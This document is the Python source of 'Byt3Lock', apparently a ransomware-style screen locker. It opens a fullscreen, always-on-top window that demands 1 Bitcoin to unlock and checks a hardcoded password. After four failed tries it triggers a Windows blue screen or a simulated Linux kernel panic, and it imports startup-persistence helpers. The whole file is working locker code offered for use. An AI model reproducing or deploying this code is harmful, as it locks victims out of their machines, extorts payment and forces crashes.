#!/usr/bin/env python

# -*- coding: utf-8 -*-



from tkinter import *

import tkinter.messagebox as messagebox

from functools import partial

import os

import sys

import keyboard

from modules import bsod, uninstall, simulate_kernel_panic, add_to_startup, remove_from_startup, get_os



os_type = get_os()

file_path = os.path.abspath(sys.argv[0])

password = "123"

count = 4

lock_text = "hacked by 0xbassiouny_!337"



def button_click(arg):

    enter_pass.insert(END, arg)



def delete_last_char():

    enter_pass.delete(-1, END)



def check_password():

    global count

    if enter_pass.get() == password:

        messagebox.showinfo("Byt3Lock", "UNLOCKED SUCCESSFULLY")

        uninstall(wind)

    else:

        count -= 1

        if count == 0:

            messagebox.showwarning("Byt3Lock", "Number of attempts expired")

            if os_type == "Windows":

                bsod()

            elif os_type == "Linux":

                simulate_kernel_panic()

            else:

                messagebox.showerror("Byt3Lock", "Unsupported OS")

        else:

            messagebox.showwarning("Byt3Lock", f"Wrong password. Available tries: {count}")

def tapp(key):

	pass            



def on_exit():

    messagebox.showwarning("Byt3Lock", "DEATH IS INEVITABLE")







wind = Tk()

wind.title("Byt3Lock")

wind.configure(bg="black")



Label(wind, bg="black", fg="red", text="> SYSTEM LOCKED By Byt3Lock <", font=("Courier", 40)).pack(pady=20)

Label(wind, bg="black", fg="red", text="Pay 1 Bitcoin to unlock.", font=("Courier", 20)).pack()

Label(wind, bg="black", fg="green", text=lock_text, font=("Courier", 18)).pack()



enter_pass = Entry(wind, bg="black", fg="red", font=("Monospace", 35), insertbackground="red", show="*")

enter_pass.pack()



wind.resizable(0, 0)



wind.lift()

wind.attributes('-topmost', True)

wind.after_idle(wind.attributes, '-topmost', True)

wind.attributes('-fullscreen', True)



button = Button(wind, text='UNLOCK', padx="31", pady="19", bg='black', fg='red', font=("Monospace", 30, "bold"), command=check_password)

button.pack()



button_labels = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9']

button_frame = Frame(wind, bg="black")

button_frame.pack()



for label in button_labels:

    Button(button_frame, text=label, padx="20", pady="20", bg='black', fg='green', font=("Courier", 18), command=partial(button_click, label)).pack(side=LEFT, padx=5, pady=5)





wind.mainloop()

